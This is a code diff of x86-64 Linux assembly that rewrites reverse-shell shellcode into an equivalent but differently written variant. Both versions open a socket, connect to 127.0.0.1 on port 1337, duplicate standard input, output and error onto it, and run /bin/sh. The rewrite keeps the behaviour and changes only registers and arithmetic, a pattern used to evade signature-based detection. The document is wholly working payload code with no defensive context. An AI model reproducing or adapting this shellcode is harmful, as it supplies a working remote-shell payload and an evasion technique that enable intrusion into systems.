@@ -3,68 +3,68 @@ global _start
 
 section .text
 _start: 
-MOV rax,0x01
-SUB rax,0x01
+xor r9,r9
+mov rax,r9
 xor rdi,rdi
-MOV rsi,0x01
-SUB rsi,0x01
+xor r10,r10
+mov rsi,r10
 xor rdx,rdx
-XOR r8,r8
-MOV rdx,r8
+xor r12,r12
+mov rdx,r12
 mov sil,0x01
-MOV dil,15
-SUB dil,13
+mov dil,6
+sub dil,4
 mov al,0x29
 syscall
-MOV r9b,al
-MOV dil,r9b
+mov r8b,al
+mov dil,r8b
 xor r11,r11
 push 0x0100007f
 push word 0x3905
 push word 0x2
-MOV r9,rsp
-MOV rsi,r9
+mov r8,rsp
+mov rsi,r8
 mov dl,0x10
-MOV al,48
-SUB al,6
+mov al,43
+sub al,1
 syscall
-MOV r11,0x01
-SUB r11,0x01
+xor r10,r10
+mov r11,r10
 mov dil,0x03
-MOV r9,r11
-MOV rsi,r9
+mov r10,r11
+mov rsi,r10
 mov al,0x21
 syscall
-MOV r11,0x01
-SUB r11,0x01
+mov r11,0x01
+sub r11,0x01
 mov dil,0x03
-MOV sil,15
-SUB sil,14
+mov sil,8
+sub sil,7
 mov al,0x21
 syscall;
-MOV r11,0x01
-SUB r11,0x01
+xor r15,r15
+mov r11,r15
 mov dil,0x03
-MOV sil,2
-SUB sil,0
+mov sil,17
+sub sil,15
 mov al,0x21
 syscall;
-XOR r10,r10
-MOV rax,r10
+xor r8,r8
+mov rax,r8
 xor rdi,rdi
-XOR r10,r10
-MOV rsi,r10
+xor r8,r8
+mov rsi,r8
 xor r13,r13
-MOV r9b,59
-MOV al,r9b
+mov r15b,59
+mov al,r15b
 mov rdi,"/bin/sh"
 push r13
 push rdi
-MOV r10,rsp
-MOV rdi,r10
+mov r8,rsp
+mov rdi,r8
 push r13
 push rdi
-MOV r12,rsp
-MOV rsi,r12
+mov r12,rsp
+mov rsi,r12
 xor rdx,rdx
 syscall
